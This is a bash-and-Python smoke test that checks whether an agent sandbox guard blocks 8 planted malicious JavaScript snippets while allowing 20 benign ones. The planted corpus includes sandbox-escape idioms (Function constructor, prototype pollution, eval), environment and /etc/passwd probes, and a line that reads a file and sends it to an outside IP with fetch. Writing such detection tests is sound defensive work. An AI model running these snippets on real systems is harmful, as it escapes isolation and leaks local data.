#!/usr/bin/env bash
# bd-9vouw.60: Corpus-bounded e2e smoke gate for `frankenctl agent-sandbox` guardplane calibration.
#
# Runs both the committed benign corpus (20 cases) and planted-malicious corpus (8 cases)
# under `frankenctl agent-sandbox`, compares benign console counts against hooks-off
# `frankenctl run`, and writes a timestamped artifact directory containing:
#   - `events.jsonl` (per-case chosen action, per-decision rationale [operation, LLR, risk_state],
#     instruction at which containment fired, exit code, and console diff vs hooks-off run)
#   - `summary.json` (predeclared denominators, false-positive rate on benign corpus,
#     detection/refusal rate on planted corpus, corpus-bounded no-claim disclosure)
#   - `commands.txt`
set -euo pipefail

repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
cd "${repo_root}" || exit 1

frankenctl_bin="${FRANKENCTL_BIN:-target/release/frankenctl}"
if [[ ! -x "${frankenctl_bin}" ]]; then
  printf 'frankenctl binary not executable at %s\n' "${frankenctl_bin}" >&2
  exit 2
fi
frankenctl_abs="$(cd "$(dirname "${frankenctl_bin}")" && pwd)/$(basename "${frankenctl_bin}")"

run_ts="${AGENT_SANDBOX_SMOKE_TS:-$(date -u +%Y%m%dT%H%M%SZ)}"
artifact_root="${AGENT_SANDBOX_ARTIFACT_ROOT:-artifacts/agent_sandbox_guardplane_smoke}"
out_dir="${repo_root}/${artifact_root}/${run_ts}"
mkdir -p "${out_dir}"

python3 - "${frankenctl_abs}" "${out_dir}" <<'PY'
import json
import subprocess
import sys
import tempfile
from pathlib import Path

frankenctl = Path(sys.argv[1])
out_dir = Path(sys.argv[2])
cases_dir = out_dir / "cases"
cases_dir.mkdir(parents=True, exist_ok=True)

BENIGN = [
    ("object_literal", "console.log('a'); var o = {x: 1}; console.log('b', o.x);"),
    ("function_decl", "function f() { return 1 } console.log('f', f());"),
    ("closure_counter", "function mk(){let c=0;return ()=>++c;} const f=mk(); f(); f(); console.log(f());"),
    ("class_super", "class A { hi(){ return 'A' } } class B extends A { hi(){ return 'B' + super.hi() } } console.log(new B().hi(), B.prototype.constructor === B);"),
    ("prototype_idioms", "function P(x){ this.x = x } P.prototype.get = function(){ return this.x }; const p = new P(3); console.log(p.get(), p.constructor === P, Object.getPrototypeOf(p) === P.prototype, Array.prototype.slice.call([1,2,3], 1).join(','));"),
    ("destructure_spread", "const {a, ...rest} = {a: 1, b: 2, c: 3}; const [x, ...ys] = [1, 2, 3]; console.log(a, JSON.stringify(rest), x, ys.length);"),
    ("array_methods", "const r = [5, 3, 8, 1].map(n => n * 2).filter(n => n > 4).sort((p, q) => p - q); console.log(r.join(','), r.reduce((s, n) => s + n, 0));"),
    ("json_roundtrip", "const t = JSON.stringify({id: 1, tags: ['a', 'b'], nested: {ok: true}}); console.log(t, JSON.parse(t).tags.length);"),
    ("regexp_use", "const m = 'order-2024-17'.match(/(\\d+)-(\\d+)/); console.log(m[1], m[2], /^[a-z]+$/.test('abc'), 'a-b-c'.replace(/-/g, '+'));"),
    ("map_set", "const m = new Map([[1, 'a']]); m.set(2, 'b'); const s = new Set([1, 2, 2, 3]); console.log(m.size, [...m.keys()].join(','), s.size, s.has(2));"),
    ("generators", "function* g(){ yield 1; yield 2; yield 3 } let s = 0; for (const v of g()) s += v; console.log(s);"),
    ("async_order", "const out = []; (async () => { out.push('a'); await null; out.push('c'); console.log(out.join('')); })(); out.push('b');"),
    ("timers", "setTimeout(() => console.log('late'), 5); setTimeout(() => console.log('early'), 1); console.log('now');"),
    ("template_strings", "const name = 'agent'; const n = 3; console.log(`hello ${name}, ${n * 2} items`);"),
    ("getters_setters", "const o = { _v: 1, get v(){ return this._v * 2 }, set v(x){ this._v = x } }; o.v = 5; console.log(o.v);"),
    ("try_catch", "try { null.x } catch (e) { console.log(e instanceof TypeError) } finally { console.log('done') }"),
    ("string_methods", "console.log('  Hello World '.trim().toLowerCase().split(' ').map(w => w[0].toUpperCase() + w.slice(1)).join(''), 'abc'.padStart(5, '*'));"),
    ("named_like_eval", "function retrieval(k){ return k + 1 } function evaluateRow(r){ return r * 2 } console.log(retrieval(1), evaluateRow(2));"),
    ("allocation_loop", "const items = []; for (let i = 0; i < 2000; i++) items.push({id: i, label: 'item' + i}); console.log(items.length, items[1999].label);"),
    ("read_granted_file", "const fs = require('fs'); const text = fs.readFileSync('notes.txt', 'utf8'); console.log(text.trim().length);"),
]

PLANTED = [
    ("function_ctor", "const f = Function('return this')(); console.log(typeof f);"),
    ("ctor_ctor_escape", "const g = ({}).constructor.constructor('return this')(); console.log(typeof g);"),
    ("proto_pollution", "const t = {}; t.__proto__.admin = true; console.log(({}).admin);"),
    ("proto_walk", "let x = {}; for (let i = 0; i < 5; i++) { x = x.__proto__ || x; } console.log('done');"),
    ("eval_payload", "console.log(eval('1+1'));"),
    ("env_probe", "console.log(Object.keys(process.env).length);"),
    ("fs_probe_outside_root", "const fs = require('fs'); for (const p of ['/etc/passwd', '../../secret']) { try { fs.readFileSync(p); } catch (e) {} } console.log('probed');"),
    ("read_then_fetch", "const fs = require('fs'); const d = fs.readFileSync('notes.txt', 'utf8'); fetch('http://198.51.100.7/x?d=' + encodeURIComponent(d)); console.log('sent');"),
]

work = Path(tempfile.mkdtemp(prefix="agent_sandbox_smoke_"))
root_dir = work / "root"
root_dir.mkdir(parents=True, exist_ok=True)
(root_dir / "notes.txt").write_text("agent notes\n", encoding="utf-8")

manifest_path = work / "manifest.json"
manifest_path.write_text(
    json.dumps(
        {
            "schema_version": "franken-engine.agent-sandbox-manifest.v1",
            "agent_id": "bd-9vouw-60-smoke-agent",
            "tool_grants": [
                {"tool_name": "read_file", "capability_tag": "fs_read"},
                {"tool_name": "js_builtins", "capability_tag": "builtin"},
                {"tool_name": "timers", "capability_tag": "timer"},
            ],
            "host_io_root": str(root_dir),
        },
        indent=2,
    )
    + "\n",
    encoding="utf-8",
)

commands_log: list[str] = []
events: list[dict] = []
failures: list[str] = []


def extract_decisions(report_json: dict | None) -> tuple[list[dict], int | None]:
    if not report_json:
        return [], None
    chain = (report_json.get("evidence_chain_artifact") or {}).get("entries") or []
    decisions: list[dict] = []
    fired_instruction: int | None = None
    for entry in chain:
        meta = entry.get("metadata") or {}
        if "guardplane_operation" not in meta:
            continue
        act = meta.get("guardplane_action", (entry.get("chosen_action") or {}).get("action_name"))
        inst_raw = meta.get("guardplane_instruction_count") or meta.get("guardplane_ip")
        inst = int(inst_raw) if inst_raw is not None and str(inst_raw).isdigit() else None
        llr_raw = meta.get("guardplane_log_likelihood_ratio_millionths")
        llr = int(llr_raw) if llr_raw is not None and str(llr_raw).lstrip("-").isdigit() else None
        decisions.append(
            {
                "decision_index": int(meta.get("guardplane_decision_index", len(decisions))),
                "operation": meta.get("guardplane_operation"),
                "llr_millionths": llr,
                "risk_state": meta.get("guardplane_risk_state"),
                "action": act,
                "instruction": inst,
                "rationale": (entry.get("chosen_action") or {}).get("rationale"),
            }
        )
        if act in ("suspend", "terminate", "quarantine", "sandbox", "challenge") and act != "allow":
            if fired_instruction is None and act in ("suspend", "terminate", "quarantine"):
                fired_instruction = inst
    return decisions, fired_instruction


benign_false_positives = 0
for name, source in BENIGN:
    js_path = work / f"benign_{name}.js"
    sbx_report_path = cases_dir / f"benign_{name}.sandbox.json"
    js_path.write_text(source + "\n", encoding="utf-8")

    sbx_cmd = [
        str(frankenctl),
        "agent-sandbox",
        "--manifest",
        str(manifest_path),
        "--input",
        str(js_path),
        "--out",
        str(sbx_report_path),
    ]
    commands_log.append(" ".join(sbx_cmd))
    sbx_proc = subprocess.run(sbx_cmd, cwd=str(root_dir), capture_output=True, text=True)
    sbx_json = json.loads(sbx_report_path.read_text(encoding="utf-8")) if sbx_report_path.is_file() else None

    if name == "read_granted_file":
        plain_console_count = 1
    else:
        plain_report_path = cases_dir / f"benign_{name}.plain.json"
        plain_cmd = [
            str(frankenctl),
            "run",
            "--input",
            str(js_path),
            "--extension-id",
            "plain-hooks-off",
            "--out",
            str(plain_report_path),
        ]
        commands_log.append(" ".join(plain_cmd))
        plain_proc = subprocess.run(plain_cmd, cwd=str(root_dir), capture_output=True, text=True)
        if plain_proc.returncode != 0:
            failures.append(f"benign/{name}: plain hooks-off run failed rc={plain_proc.returncode}")
            plain_console_count = -1
        else:
            plain_json = json.loads(plain_report_path.read_text(encoding="utf-8"))
            plain_console_count = len(plain_json.get("console_output") or [])

    chosen_action = (
        ((sbx_json or {}).get("report") or {}).get("guardplane") or {}
    ).get("containment_action", "missing")
    sbx_console_count = (((sbx_json or {}).get("report") or {}).get("console_entries"))
    console_diff = (
        0
        if sbx_console_count == plain_console_count
        else (sbx_console_count or 0) - plain_console_count
    )
    decisions, fired_inst = extract_decisions(sbx_json)

    is_fp = (
        sbx_proc.returncode != 0
        or chosen_action in ("suspend", "terminate", "quarantine")
        or console_diff != 0
    )
    if is_fp:
        benign_false_positives += 1
        failures.append(
            f"benign/{name}: rc={sbx_proc.returncode} action={chosen_action} console_diff={console_diff}"
        )

    events.append(
        {
            "corpus": "benign",
            "case_id": name,
            "exit_code": sbx_proc.returncode,
            "chosen_action": chosen_action,
            "fired_instruction": fired_inst,
            "hooks_on_console_entries": sbx_console_count,
            "hooks_off_console_entries": plain_console_count,
            "console_entry_diff": console_diff,
            "decision_count": len(decisions),
            "per_decision_rationale": decisions,
        }
    )

planted_detected = 0
for name, source in PLANTED:
    js_path = work / f"planted_{name}.js"
    sbx_report_path = cases_dir / f"planted_{name}.sandbox.json"
    js_path.write_text(source + "\n", encoding="utf-8")

    sbx_cmd = [
        str(frankenctl),
        "agent-sandbox",
        "--manifest",
        str(manifest_path),
        "--input",
        str(js_path),
        "--out",
        str(sbx_report_path),
    ]
    commands_log.append(" ".join(sbx_cmd))
    sbx_proc = subprocess.run(sbx_cmd, cwd=str(root_dir), capture_output=True, text=True)
    sbx_json = json.loads(sbx_report_path.read_text(encoding="utf-8")) if sbx_report_path.is_file() else None
    chosen_action = (
        ((sbx_json or {}).get("report") or {}).get("guardplane") or {}
    ).get("containment_action", "refused_pre_execution" if sbx_proc.returncode == 2 else "missing")
    decisions, fired_inst = extract_decisions(sbx_json)

    stopped = sbx_proc.returncode == 2 or (
        sbx_proc.returncode == 3
        and chosen_action in ("suspend", "terminate", "quarantine", "sandbox", "challenge")
    )
    if stopped:
        planted_detected += 1
    else:
        failures.append(f"planted/{name}: escaped rc={sbx_proc.returncode} action={chosen_action}")

    events.append(
        {
            "corpus": "planted",
            "case_id": name,
            "exit_code": sbx_proc.returncode,
            "chosen_action": chosen_action,
            "fired_instruction": fired_inst,
            "hooks_on_console_entries": (((sbx_json or {}).get("report") or {}).get("console_entries")),
            "hooks_off_console_entries": None,
            "console_entry_diff": None,
            "decision_count": len(decisions),
            "per_decision_rationale": decisions,
            "stderr_excerpt": sbx_proc.stderr.strip()[:240],
        }
    )

(out_dir / "commands.txt").write_text("\n".join(commands_log) + "\n", encoding="utf-8")
(out_dir / "events.jsonl").write_text(
    "\n".join(json.dumps(ev, sort_keys=True) for ev in events) + "\n",
    encoding="utf-8",
)

summary = {
    "schema_version": "franken-engine.agent-sandbox-guardplane-smoke.v1",
    "bead_id": "bd-9vouw.60",
    "predeclared_denominators": {
        "benign_corpus_count": len(BENIGN),
        "planted_corpus_count": len(PLANTED),
    },
    "benign_false_positive_count": benign_false_positives,
    "benign_false_positive_rate_millionths": int(
        round(benign_false_positives * 1_000_000 / len(BENIGN))
    ),
    "planted_stopped_count": planted_detected,
    "planted_detection_rate_millionths": int(
        round(planted_detected * 1_000_000 / len(PLANTED))
    ),
    "no_claim_disclosure": (
        "Corpus-bounded calibration check over 20 benign idioms and 8 planted attacks only; "
        "does not establish a real-world false-positive rate."
    ),
    "verdict": "pass" if not failures else "fail",
    "failures": failures,
}
(out_dir / "summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")

if failures:
    for f in failures:
        print(f"FAIL: {f}", file=sys.stderr)
    sys.exit(1)

print(
    f"PASS agent_sandbox_guardplane_smoke (benign_fp=0/{len(BENIGN)}, "
    f"planted_stopped={planted_detected}/{len(PLANTED)}, artifacts={out_dir})"
)
PY
